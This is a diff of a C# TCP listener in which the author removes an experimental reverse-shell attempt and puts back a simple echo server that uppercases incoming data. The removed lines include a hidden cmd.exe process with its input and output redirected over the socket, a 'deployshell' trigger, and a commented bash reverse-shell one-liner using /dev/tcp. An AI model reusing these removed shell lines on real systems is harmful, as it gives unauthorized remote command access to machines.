@@ -86,71 +86,22 @@ namespace tcp_listener
                         NetworkStream stream = client.GetStream();
 
                         int i;
-                        //for reference https://www.puckiestyle.nl/c-simple-reverse-shell/
-                        /*while (client.Connected)
-                        {
-                            using (StreamReader rdr = new StreamReader(stream))
-                            {
-                                streamWriter = new StreamWriter(stream);
 
-                                StringBuilder strInput = new StringBuilder();
-
-                                Process p = new Process();
-                                p.StartInfo.FileName = "cmd.exe";
-                                p.StartInfo.CreateNoWindow = true;
-                                p.StartInfo.UseShellExecute = false;
-                                p.StartInfo.RedirectStandardOutput = true;
-                                p.StartInfo.RedirectStandardInput = true;
-                                p.StartInfo.RedirectStandardError = true;
-                                p.OutputDataReceived += new DataReceivedEventHandler(output);
-                                p.Start();
-                                p.BeginOutputReadLine();
-
-                                while (true)
-                                {
-                                    strInput.Append(rdr.ReadLine());
-                                    //strInput.Append("\n");
-                                    p.StandardInput.WriteLine(strInput);
-                                    strInput.Remove(0, strInput.Length);
-                                }
-                            }
-                        }*/
-                        // Loop to receive all the data sent by the client.
-                        
-                        while (client.Connected)
-                        {
-                            //Byte[] newbytes = new Byte[256];
-                            //streamWriter = new StreamWriter(stream);
-
-                            string text = Console.ReadLine();
-                            if (text == "deployshell")
-                            {
-                                //string payload = "bash -i >& /dev/tcp/10.0.2.15/100 0>&1";
-                                string te = "ls";
-                                byte[] msg = System.Text.Encoding.ASCII.GetBytes(te);
-                                stream.Write(msg, 0, msg.Length);
-                            }
-                        }
-
-                        /*while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
+                        while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                         {
                             // Translate data bytes to a ASCII string.
                             data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-                            Console.WriteLine(data);
+                            Console.WriteLine("Received: {0}", data);
 
                             // Process the data sent by the client.
-                            //data = data.ToUpper();
+                            data = data.ToUpper();
 
                             byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);
-
-                            //data = Console.ReadLine();
-
-                            //stream.Read(msg, 0, msg.Length);
 
                             // Send back a response.
                             stream.Write(msg, 0, msg.Length);
                             Console.WriteLine("Sent: {0}", data);
-                        }*/
+                        }
 
                         // Shutdown and end connection
                         client.Close();
